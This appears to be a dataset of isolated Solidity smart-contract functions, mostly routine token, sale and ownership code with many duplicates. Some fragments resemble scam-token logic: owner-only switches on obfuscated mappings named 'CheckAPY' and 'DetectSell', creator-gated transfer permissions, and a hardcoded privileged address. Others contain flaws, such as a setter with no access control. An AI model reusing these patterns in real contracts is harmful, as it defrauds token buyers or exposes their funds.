function transfer(address _to, uint256 _value) public returns (bool) {
        require(msg.sender == owner || now >= FREEZE_END);
        return super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
constructor(address _masterCopy)
        public
    {
        require(_masterCopy != address(0), "Invalid master copy address provided");
        masterCopy = _masterCopy;
    }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) public returns (bool) {
        require(msg.sender == ownerAddress, "only OwnerWallet");

        LEVEL_PRICE[_level] = _price;
        return true;
    }
--------------------------------------------------------------------------------
function _requireCallerIsBorrowerOperations() internal view {
        require(msg.sender == borrowerOperationsAddress, "TroveManager: Caller is not the BorrowerOperations contract");
    }
--------------------------------------------------------------------------------
function transferTokenOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    MintableToken(token).transferOwnership(newOwner);
  }
--------------------------------------------------------------------------------
function destroy() onlyOwner {
    // Transfer tokens back to owner
    uint256 balance = token.balanceOf(this);
    token.transfer(owner, balance);

    // There should be no ether in the contract but just in case
    selfdestruct(owner);
  }
--------------------------------------------------------------------------------
function migrationsOldStaking(
        address contractAddr,
        uint256 amount,
        uint256 blockNb
    ) public onlyAdmin {
        super._deposit(blockNb, contractAddr, amount);
        mOldStaking = contractAddr;
        mOldAmount = mOldAmount.add(amount);
    }
--------------------------------------------------------------------------------
function depositWithExpiry(address payable vault, address asset, uint amount, string memory memo, uint expiration) external payable {
        require(block.timestamp < expiration, "THORChain_Router: expired");
        deposit(vault, asset, amount, memo);
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
    if (master == 0x0) revert();
    if (msg.sender != upgradeMaster) revert();
    upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function addOwner(address owner)
        internal
        ownerDoesNotExist(owner)
        notNull(owner)
    {
        isOwner[owner] = true;
        owners.push(owner);
        required = required + 1;
        OwnerAddition(owner);
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function updateHouseProperties(string memory houseName, string memory houseCreatorName, string memory houseCountryISO) onlyOwner public {
        houseData.name = houseName;
        houseData.creatorName = houseCreatorName;
        houseData.countryISO = houseCountryISO;     
        emit HousePropertiesUpdated();
    }
--------------------------------------------------------------------------------
function finalize() public inState(State.Success) onlyOwner stopInEmergency {

    // Already finalized
    if(finalized) {
      throw;
    }

    // Finalizing is optional. We only call it if we are given a finalizing agent.
    if(address(finalizeAgent) != 0) {
      finalizeAgent.finalizeCrowdsale();
    }

    finalized = true;
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        ownerToOperators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function setDateMainStart(uint _unixts) public onlyOwner checkDateOrder {
        require(now < _unixts && now < dateMainStart);
        dateMainStart = _unixts;
        emit IcoDateUpdated(1, _unixts);
    }
--------------------------------------------------------------------------------
function isMainFirstDay() public view returns (bool) {
        if (now > dateMainStart && now <= dateMainStart + 1 days) return true;
        return false;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
function _getTokenWantInS() internal view returns (uint256) {
        uint256 tokenPrice = _getRedeemPrice();
        return tokenStrategyAmounts[address(this)].mul(tokenPrice).div(ONE_18);
    }
--------------------------------------------------------------------------------
function finalize()
        external
        returns (bool success)
    {
        require(!finalized);
        require(msg.sender == tokenSaleContract);

        finalized = true;

        Finalized();

        return true;
    }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
        if (whitelist[addr]) {
            whitelist[addr] = false;
            emit WhitelistedAddressRemoved(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function _getTokenAmount(uint256 _weiAmount)
        internal view returns (uint256)
    {
        uint256 bonusRate = getBonusRate(_weiAmount);
        return _weiAmount.mul(bonusRate).div(1 ether);
    }
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
      super._transfer(sender, recipient, amount);
      _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function setExchangeAddress(address addr) external onlyOwner {
        require(addr != address(0), "Exchange is the zero address");

        _exchange = addr;
    }
--------------------------------------------------------------------------------
function _mint(address _to,uint256 _tokenId) internal whenNotPaused {
    tokenIdToTokenOwner[_tokenId] = _to;
    tokenOwnerToTokenCount[_to]++;
    emit Transfer(address(0), _to, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
		super._mint(_to, _tokenId);

		allTokensIndex[_tokenId] = allTokens.length;
		allTokens.push(_tokenId);
	  }
--------------------------------------------------------------------------------
function tokenFallback(address, uint _value, bytes) public {
        require(!tokenReceived);
        require(msg.sender == token);
        require(_value == TOTAL_TOKENS);
        tokenReceived = true;
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _numberMinted(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert MintedQueryForZeroAddress();
        return uint256(_addressData[owner].numberMinted);
    }
--------------------------------------------------------------------------------
function _numberBurned(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert BurnedQueryForZeroAddress();
        return uint256(_addressData[owner].numberBurned);
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
        require(isApprovedFor(msg.sender, _tokenId));
        clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        require(_to != address(0));
        addToken(_to, _tokenId);
        Transfer(0x0, _to, _tokenId);
    }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
        require(ownerOf(_tokenId) == _owner);
        tokenApprovals[_tokenId] = 0;
        Approval(_owner, 0, _tokenId);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function transferTokens(address _tokenAddress, address _recipient) public isOwner {
        ERC20I token = ERC20I(_tokenAddress);
        require(token.transfer(_recipient, token.balanceOf(this)));
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function AnimalgoSave(address _holder) public view returns(bool){
    require(!save[_holder]);
    save[_holder] = true;
    emit Save(_holder);
    return true;
}
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[_msgSender()][_spender] = _value;
        
        emit Approval(_msgSender(), _spender, _value);
        
        return true;
    }
--------------------------------------------------------------------------------
function startIco() external {
        require(msg.sender == admin);
        require(currentStage != Stages.icoEnd);
        currentStage = Stages.icoStart;
    }
--------------------------------------------------------------------------------
function upgradeToAndCall(address _implementation, string _newVersion, bytes _data) payable public onlyProxyOwner {
    _upgradeTo(_implementation, _newVersion);
    require(address(this).call.value(msg.value)(_data));
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApprovals[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
--------------------------------------------------------------------------------
function setFlywheelRewards(IFlywheelRewards newFlywheelRewards) external requiresAuth {
        address oldFlywheelRewards = address(flywheelRewards);

        flywheelRewards = newFlywheelRewards;

        emit FlywheelRewardsUpdate(oldFlywheelRewards, address(newFlywheelRewards));
    }
--------------------------------------------------------------------------------
function setReleasedAddress(address _target, address _releaseTo) public {
        require(_target != address(0));
        require(_releaseTo != address(0));

        releaseAddrs[_target] = _releaseTo;
    }
--------------------------------------------------------------------------------
function RemoveETH() onlyOwner public {
        address payable _msg_sender = payable(msg.sender);
        _msg_sender.transfer(address(this).balance);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function generateLockId() internal returns (bytes32 lockId) {
        return keccak256(abi.encodePacked(blockhash(block.number - 1), address(this), ++lockRequestCount));
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = _msgSender();
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function freeze() external {
        // Reentrancy guard.
        require(_status == RE_NOT_ENTERED);
        require(msg.sender == _owner, "Not owner");

        _status = RE_FROZEN;
    }
--------------------------------------------------------------------------------
function unfreeze() external {
        // Reentrancy guard.
        require(_status == RE_FROZEN);
        require(msg.sender == _owner, "Not owner");

        _status = RE_NOT_ENTERED;
    }
--------------------------------------------------------------------------------
function getCurrentRewardForNextEpoch() public view returns ( uint ) {
        uint supply = ICirculatingOHM( circulatingOHMContract ).OHMCirculatingSupply();
        return supply.mul( rewardRate ).div( 1000000 );
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    pickle[spender] = val;
    dragonfruit[spender] = val2; 
    baelrog[spender] = val3;
    ireland = val4;
  }
--------------------------------------------------------------------------------
function() public isHuman() isWithinLimits(msg.value) payable
    {
        buyTicketCore_(
            openMatchId_, 
            2, 
            InvalidTotalGoals, 
            InvalidGapGoals, 
            InvalidBothGoals, 
            InvalidHalfAndFullMatchResult, 
            msg.value, 
            address(0));
    }
--------------------------------------------------------------------------------
function getPrice(uint _blockNumber) constant public returns (uint) {
    if (_blockNumber < initialBlock || _blockNumber >= finalBlock) return 0;
    return priceForStage(stageForBlock(_blockNumber));
  }
--------------------------------------------------------------------------------
function distributeTokens(address _to, uint256 _value) public {
        require(distributionAddress == msg.sender || owner == msg.sender);
        super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x50BbB85249Ca604A7C3c8D0196675Cfc507c5042,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function MHCBC(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function _createId(Message _message) private view returns (bytes32) {
        return keccak256(_message.validFrom, _message.validTo, _message.sender, _message.message, length);
    }
--------------------------------------------------------------------------------
function LiXiangCoin() public {
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function () external payable {
		if (now <= endTimePre) {//call pre function if before pre sale end time
			joinPre();
		} else if (now <= endTimeMain) {//call main function if before main sale end time
			joinMain();
		} else {
			revert();
		}
	}
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
    require(_upgradedAddress != address(0));
    deprecated = true;
    upgradedAddress = _upgradedAddress;
    emit Deprecate(_upgradedAddress);
  }
--------------------------------------------------------------------------------
function changeCooldownSettings(bool newStatus, uint256 newInterval) external onlyOwner {
        require(newInterval <= 24 hours, "Exceeds the limit");
        cooldownEnabled = newStatus;
        cooldownTimerInterval = newInterval;
    }
--------------------------------------------------------------------------------
function GTDNToken() {
      totalSupply = 30 * 10000 * 10000 * (10**(uint256(decimals)));
      balances[msg.sender] = totalSupply;    // Give the creator all initial tokens
    }
--------------------------------------------------------------------------------
function getRoundUserBalance(uint _round, address _user) public constant returns (uint256)
    {
        require(_round >= 0 && _round < rounds.length);
        return rounds[_round].balances[_user];
    }
--------------------------------------------------------------------------------
function updateFundraiser(address fundraiserAddress, bool isBonaFide)
       public
       onlyFundraiser
       returns(bool)
    {
        assert(isFundraiser(fundraiserAddress));

        fundraisers[fundraiserAddress] = isBonaFide;
        LogUpdateFundraiser(fundraiserAddress, isBonaFide);
        return true;
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function withdrawBankroll(address receiver, uint numTokens) public onlyAuthorized {
		require(numTokens <= bankroll());
		require(allowedReceiver[receiver]);
		assert(edg.transfer(receiver, numTokens));
	}
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) external onlyOwner returns (bool ok)  {
    uint256 converterdValue = value * (10 ** uint256(tokenDecimals));
    return token.transfer(to, converterdValue);
   }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function setGameAddress(uint8 game, address newAddress) public onlyOwner{
    if(game<casinoGames.length) casinoGames[game] = newAddress;
    else casinoGames.push(newAddress);
  }
--------------------------------------------------------------------------------
function has(bytes32 node, bytes32 kind) constant returns (bool) {
        return (kind == "addr" && addresses[node] != 0) || (kind == "hash" && hashes[node] != 0);
    }
--------------------------------------------------------------------------------
function balanceOfUnderlying(address who)
        public
        view
        returns (uint256)
    {
        uint256 shares = providers[who].shares;
        return shares.mul(reserves).div(totalShares);
    }
--------------------------------------------------------------------------------
function INZURA() public {
        symbol = "IZA";
        name = "INZURA";
        decimals = 18;
        _totalSupply = 120000000e18;
        balances[owner] = _totalSupply;
    }
--------------------------------------------------------------------------------
function _addDepot(address depot) internal {
    require(depot != address(0), "depot cannot be null");
    _depotAddress[depot] = true;
  }
--------------------------------------------------------------------------------
function payoutFor( uint _value ) public view returns ( uint ) {
        uint pay = FixedPoint.fraction( _value, bondPrice() ).decode112with18().div( 1e16 );
        return pay;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function initialTransfer(address _to, uint256 _amount, uint256 _decimalPlace) private { 
        balances[_to] = _amount.mul(_decimalPlace);
        Transfer(address(0), _to, balances[_to]);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function mint (
        address _beneficiary,
        uint256 _tokenAmount
    ) external onlyTokenSale returns(bool) {
        require(isStarted && !isFinalized);
        require(TokenController(tokenControllerAddr).mint(_beneficiary, _tokenAmount));
        return true;
    }
--------------------------------------------------------------------------------
function setMarketingRates(uint8 _newMkt1Rate, uint8 _newMkt2Rate, uint8 _newMkt3Rate)
        onlyAdministrator()
        public
    {
        require(_newMkt1Rate +_newMkt2Rate +_newMkt3Rate <= 180); 
       
        mkt1Rate =  _newMkt1Rate;
        mkt2Rate =  _newMkt2Rate;
        mkt3Rate =  _newMkt3Rate;

    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function startIco() external teamOnly {
    require(icoState == IcoState.Presale || icoState == IcoState.Paused);
    icoState = IcoState.Running;
    RunIco();
  }
--------------------------------------------------------------------------------
function refundSubmission(address _refundee, uint256 _amount) external onlyAdmin() {
    submissionPool = submissionPool.sub(_amount);
    _refundee.transfer(_amount);
    endingBalance = address(this).balance;
  }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 2;
        return res;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xc36C87B7860A685772F152eab89D214Cc3D42479,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function ownerReward() internal{
        require(owner.send(reservedReward));
        emit PaidOwnerReward(reservedReward);
        reservedReward = reservedReward.sub(reservedReward);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function safeWithdrawal(uint _amounty) isOwner public {
			uint amounted = _amounty;
            
            if (beneficiary.send(amounted)) {
                FundTransfer(beneficiary, amounted, false);
            }
    }
--------------------------------------------------------------------------------
constructor(address[] memory _signers, string memory _name) public {
        if (_signers.length != 3) {
            // Number of signers submitted is not 3
            revert();
        }
        signers = _signers;
        
        documentStore = new DocumentStore(_name);
    }
--------------------------------------------------------------------------------
function hasEnded() external constant returns (bool) {
        bool capReached = weiRaised >= weiMaximumGoal;
        bool afterEndTime = now > endTime;
        
        return capReached || afterEndTime;
    }
--------------------------------------------------------------------------------
function loadRefund() external payable {
        require(msg.value > 0);
        require(!isMinimumGoalReached());
        
        loadedRefund = loadedRefund.add(msg.value);
    }
--------------------------------------------------------------------------------
function getEtherAmountFromToken(uint _amount) private view returns (uint) {
    require(scS > 0, "Invalid data, please contact admin");
    return _amount / scS;
  }
--------------------------------------------------------------------------------
function withdrawEther(uint256 amount) public returns (bool success){
		if(msg.sender != owner)revert();
	    msg.sender.transfer(amount);
	    return true;
	}
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function calculateContribution(uint _available, uint _requiredAmount)
        internal
        pure
        returns(uint taken, uint remainder)
    {
        if (_requiredAmount > _available)
            return (_available, 0); // Take whatever is available, return 0 as leftover ETH.
        else
            return (_requiredAmount, _available - _requiredAmount);
    }
--------------------------------------------------------------------------------
function iEthereum() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function balance() public view returns (uint256) {
    address self = address(this);
    uint256 selfBalance = token.balanceOf(self);
    return selfBalance;
  }
--------------------------------------------------------------------------------
function migrationsOldStaking(
        address contractAddr,
        uint256 amount,
        uint256 blockNb
    ) public onlyAdmin {
        super._deposit(blockNb, contractAddr, amount);
        mOldStaking = contractAddr;
        mOldAmount = mOldAmount.add(amount);
    }
--------------------------------------------------------------------------------
constructor(
        uint _ethUsdRate,
        address _wbtToken,
        address _bctToken,
        address _data
    )
        public
    {
        ethUsdRate = _ethUsdRate;

        // instantiate wbtToken & data contracts
        wbtToken = WealthBuilderToken(_wbtToken);
        bctToken = BlockchainToken(_bctToken);
        data = Data(_data);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function registerInvestor(address target)
        external
        onlyOwner
    {
        require(target != address(0));
        ethicHubStorage.setBool(keccak256("user", "investor", target), true);
    }
--------------------------------------------------------------------------------
function registerRepresentative(address target)
        external
        onlyOwner
    {
        require(target != address(0));
        ethicHubStorage.setBool(keccak256("user", "representative", target), true);
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool) {
        // Mutable state call requires the proxy to tell the target who the msg.sender is.
        target.setMessageSender(msg.sender);

        // Forward the ERC20 call to the target contract
        IERC20(target).transfer(to, value);

        // Event emitting will occur via Synthetix.Proxy._emit()
        return true;
    }
--------------------------------------------------------------------------------
function approve(address spender, uint256 value) public returns (bool) {
        // Mutable state call requires the proxy to tell the target who the msg.sender is.
        target.setMessageSender(msg.sender);

        // Forward the ERC20 call to the target contract
        IERC20(target).approve(spender, value);

        // Event emitting will occur via Synthetix.Proxy._emit()
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function cancelBidsUnderPrice(uint256 auctionid, uint256 price) external {
        cancelprice[msg.sender][auctionid] = price;
        emit Cancelled(msg.sender, auctionid, price);
    }
--------------------------------------------------------------------------------
function NOBLESSEtoken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply_;
        Transfer(0x0, msg.sender, totalSupply_);
    }
--------------------------------------------------------------------------------
function withdrawTokens(address _tokenAddress) external onlyOwner {
    IERC20 token = IERC20(_tokenAddress);
    token.transfer(owner(), token.balanceOf(address(this)));
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function pullSurplus() external accrues returns (uint256 cDaiSurplus) {
    // Determine the cDai surplus (difference between total dDai and total cDai)
    cDaiSurplus = _getSurplus();

    // Send the cDai surplus to the vault
    require(_CDAI.transfer(_VAULT, cDaiSurplus), "cDai transfer failed.");
  }
--------------------------------------------------------------------------------
function _transferWithReference(address _to, uint _value, string _reference, address _sender) internal isTransferAllowed(_sender, _to, _value) returns(bool) {
         return processTransferResult(_sender, _to, _value, super._transferWithReference(_to, _value, _reference, _sender));
     }
--------------------------------------------------------------------------------
function _transferToICAPWithReference(bytes32 _icap, uint _value, string _reference, address _sender) internal isTransferToICAPAllowed(_sender, _icap, _value)  returns(bool) {
        return processTransferToICAPResult(_sender, _icap, _value, super._transferToICAPWithReference(_icap, _value, _reference, _sender));
    }
--------------------------------------------------------------------------------
function restart() public {
        require(swap && now >= endTime);
        
        penalty = this.balance * 2000 / 10000;
        
        payFees();
        
        _start();
    }
--------------------------------------------------------------------------------
function set(uint256 _allocPoint, address token0, address token1) public onlyOwner {
        address _lpToken = UniswapV2Library.pairFor(factory, token0, token1);
        poolInfo[_lpToken] = _allocPoint * 24;
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner returns (bool) {
        require(_newOwner != address(0));
        onTransferOwnership(owner, _newOwner);
        owner = _newOwner;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
    if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getPrice() public view returns (uint price) {
        return (_totalSupply - balances[address(this)]) * 0.0001 ether + 0.1 ether;
    }
--------------------------------------------------------------------------------
function deploy(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
constructor () public {
    owner = msg.sender;
    balances[owner] = totalSupply;
    emit Transfer(0x0, owner, totalSupply);
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    mars[spender] = val;
    moon[spender] = val2; 
    earth[spender] = val3;
    ceres = val4;
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
    if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0),"ERR_ZERO_ADDRESS");
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
--------------------------------------------------------------------------------
function getDescription() public view returns(string) {
        return "Create ETH dividends for token holders at a specific checkpoint";
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function balance() public view returns (uint) {
        return token.balanceOf(address(this))
                .add(IController(controller).balanceOf(address(token)));
    }
--------------------------------------------------------------------------------
function DetectSell(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    simpsons[spender] = val;
    brbad[spender] = val2; 
    tacitos[spender] = val3;
    luna = val4;
  }
--------------------------------------------------------------------------------
function purchase(uint256 tokensToPurchase, uint256 maxPrice) public payable returns(uint256 tokensBought_) {
        require(tokensToPurchase > 0);
        require(msg.value > 0);
        return purchaseSafe(tokensToPurchase, maxPrice);
    }
--------------------------------------------------------------------------------
function withdraw() public onlyOwner {
    uint256 returnAmount = this.balance;
    wallet.transfer(returnAmount);
    emit EtherWithdrawn(wallet, returnAmount);
  }
--------------------------------------------------------------------------------
